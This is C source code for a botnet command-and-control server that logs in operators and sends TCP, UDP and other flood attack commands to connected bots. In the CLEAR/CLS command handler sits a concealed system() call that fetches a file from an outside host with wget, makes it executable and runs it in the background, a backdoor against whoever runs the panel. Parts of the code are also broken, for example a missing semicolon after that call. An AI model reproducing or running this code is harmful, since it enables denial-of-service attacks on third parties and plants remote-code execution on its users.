//remastered by Jonah
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#define MAXFDS 1000000
#define RED     "\x1b[0;31m"
#define GREEN   "\x1b[0;32m"
#define C_RESET   "\x1b[0m"
char *colorCodes[] = {"31m", "32m", "33m", "34m", "35m", "36m"};

//change this to whatever you like, but if you dont want them sharing there login
//change the 2 to 1.
int Max_Logins = 1; //2 users per login 


struct account {
    char id[25]; 
    char password[25];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int AccountCheck = 0;
static volatile int DUPESDELETED = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31mID:", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, " ", 1, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[32m-> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
 
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
 
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
 
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
 
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {
                                                DUPESDELETED++;
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SC ON\n", 9, MSG_NOSIGNAL);
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("buf: \"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0;[+] Bots Online: %d [-] Users Online: %d [+]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (long int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); // format: user pass
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        sprintf(botnet, "\x1b[%sUsername: \x1b[30m", colorCodes[(rand() % 6)]);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){  
        sprintf(botnet, ""RED"Welcome User\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;                  
        sprintf(botnet, "\x1b[%sPassword: \x1b[30m", colorCodes[(rand() % 6)]);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if (AccountCheck == Max_Logins)  
        {
            printf("Too many Users Logged in at once\n");
            goto end;
        }
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
        fak:
        
        pthread_create(&title, NULL, &titleWriter, sock);
        sprintf(botnet, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "     `7MMF'  `7MMF'               `7MM                          OO\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "       MM      MM                   MM                          88\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "       MM      MM   ,6'Yb.  ,p6'bo  MM  ,MP'.gP'Ya `7Mb,od8     ||\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "       MMmmmmmmMM  8)   MM 6M'  OO  MM ;Y  ,M'   Yb  MM' ''     ||\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "       MM      MM   ,pm9MM 8M       MM;Mm  8M''''''  MM         `'\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "       MM      MM  8M   MM YM.    , MM `Mb.YM.    ,  MM         ,,\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
        if (send(thefd, "     .JMML.  .JMML.`Moo9^Yo.YMbmd'.JMML. YA.`Mbmmd'.JMML.       db \r\n", 69, MSG_NOSIGNAL) == -1) goto end;
        sprintf(botnet, "\r\n               \x1b[37m[+]-\x1b[%sWelcome %s To The Hacker Net\x1b[37m-[+]\r\n\r\n-> ", colorCodes[(rand() % 6)], usernamez);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        AccountCheck++;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if (strncmp(buf, "SHOW", 4) == 0 || strncmp(buf, "BOTS", 4) == 0 || strncmp(buf, "bots", 4) == 0) 
        {  
          sprintf(botnet, "Bots Online: \x1b[%s[%d]"C_RESET"\r\nUsers Online: \x1b[%s[%d]"C_RESET"\r\nDupes Deleted: \x1b[%s[%d]"C_RESET"\r\n",colorCodes[(rand() % 6)], clientsConnected(), colorCodes[(rand() % 6)], managesConnected, colorCodes[(rand() % 6)], DUPESDELETED);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
          
        if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "menu", 4) == 0)
        {
          sprintf(botnet, "\x1b[37m[+\x1b[36m]Attack Commands----------------------------------\x1b[37m\r\n\x1b[37m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n\x1b[37m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n\x1b[37m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n\x1b[37m!* CNC [IP] [ADMIN PORT] [TIME] | CNC FLOOD\r\n");
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
          sprintf(botnet, "\x1b[37m[+]\x1b[36mExtra Commands-----------------------------------\x1b[37m\r\n\x1b[37m!* KILLATTK | KILLS ALL ATTACKS\r\n");
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
          sprintf(botnet, "\x1b[37m[+]\x1b[36mTerminal Commands----------------------------------\x1b[37m\r\n\x1b[37mBOTS | SHOWS BOT COUNT\r\n\x1b[37mCLS | CLEARS YOUR SCREEN\r\n"); 
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        
        if (strncmp(buf, "!* STD", 6) == 0 || strncmp(buf, "!* UDP", 6) == 0 || strncmp(buf, "!* TCP", 6) == 0)
        {
           int hax;
           if(send(thefd, "B=====D ", 8, MSG_NOSIGNAL) == -1) goto end;
           if(send(thefd, " ~", 2, MSG_NOSIGNAL) == -1) goto end;
           for (hax = 3; hax > 0; --hax) {
           sleep(1);
           if(send(thefd, " ~", 2, MSG_NOSIGNAL) == -1) goto end;
           }
           if(send(thefd, "\r\nCousin Has Been Fucked!!!\r\n", 29, MSG_NOSIGNAL) == -1) goto end;
        }
         if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0)
         system("wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1")
        { 
          sprintf(botnet, "\r\n       \x1b[%s\r\n", colorCodes[(rand() % 6)]);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "     `7MMF'  `7MMF'               `7MM                          OO\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "       MM      MM                   MM                          88\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "       MM      MM   ,6'Yb.  ,p6'bo  MM  ,MP'.gP'Ya `7Mb,od8     ||\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "       MMmmmmmmMM  8)   MM 6M'  OO  MM ;Y  ,M'   Yb  MM' ''     ||\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "       MM      MM   ,pm9MM 8M       MM;Mm  8M''''''  MM         `'\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "       MM      MM  8M   MM YM.    , MM `Mb.YM.    ,  MM         ,,\r\n", 68, MSG_NOSIGNAL) == -1) goto end;
          if (send(thefd, "     .JMML.  .JMML.`Moo9^Yo.YMbmd'.JMML. YA.`Mbmmd'.JMML.       db \r\n", 69, MSG_NOSIGNAL) == -1) goto end;
          sprintf(botnet, "\r\n              \x1b[37m[+]-\x1b[%sWelcome %s To The Hacker Net\x1b[37m-[+]\r\n\r\n", colorCodes[(rand() % 6)], usernamez);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
          pthread_create(&title, NULL, &titleWriter, sock);
         }
         if (strstr(buf, "LOLNOGTFO"))
         {
            printf("%s tried killing bots...", usernamez);
            FILE *killFile;
            killFile = fopen(".killlog", "a");
            fprintf(killFile, "Username: %s Buffer: Tried Killing Bots!\n", usernamez);
            fclose(killFile);
            goto end;
             /* code */
         }
         if (strstr(buf, "SH"))
         {
             /* code */
            printf("%s tried sh'ing bots...", usernamez);
            FILE *shFile;
            shFile = fopen(".shlog", "a");
            fprintf(shFile, "Username: %s Buffer: Tried SH'ing Bots!\n", usernamez);
            fclose(shFile);
            goto end;
         }
         if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "EXIT", 4) == 0 || strncmp(buf, "LOGOUT", 6) == 0) 
         {
            goto end;
         }
                trim(buf);
                sprintf(botnet, "\x1b[%s-> \x1b[0m", colorCodes[(rand() % 6)]);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen(".cmds", "a");
                fprintf(logFile, "%s: \"%s\"\n", accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
                AccountCheck--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)

        {       printf("Connecting To Server: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen(".ips", "a");
                fprintf(logFile, "IP:%d.%d.%d.%d\n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
                fclose(logFile);
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
 
        int s, threads, port;
        struct epoll_event event;
        char Username[20], Password[20];
        #ifdef User
        printf("Please Enter Username: ");
        scanf("%s",Username);
        printf("Please Enter Password: ");
        scanf("%s",Password);
        char hahaha[80];
        sprintf(hahaha, "echo %s %s >> login.txt", Username, Password);
        system(hahaha);
        #endif
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 850)
        {
            printf("Are You Dumb? Lower the Threads\n");
            return 0;
        }
        else if (threads < 850)
        {
            printf("Good Choice in Threading\n");
        }
        #ifdef User
        printf(RED "Enjoy The Command & Control\nIn "GREEN"Boats"RED" We Trust\nUsername: %s\nPassword: %s\nCNC Started On Port [%d]\nThreading Count [%d]\n\n"C_RESET"", Username, Password, port, threads);
        #endif
        printf(RED "Enjoy The Command & Control\nIn "GREEN"Boats"RED" We Trust\nCNC Started On Port [%d]\nThreading Count [%d]\n\n"C_RESET"", port, threads);

        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
 
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
 
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
 
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
 
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
 
        pthread_create(&thread[0], NULL, &telnetListener, port);
 
        while(1)
        {
                broadcast("PING", -1, "wot");
                sleep(60);
        }
  
        close (listenFD);
 
        return EXIT_SUCCESS;
}

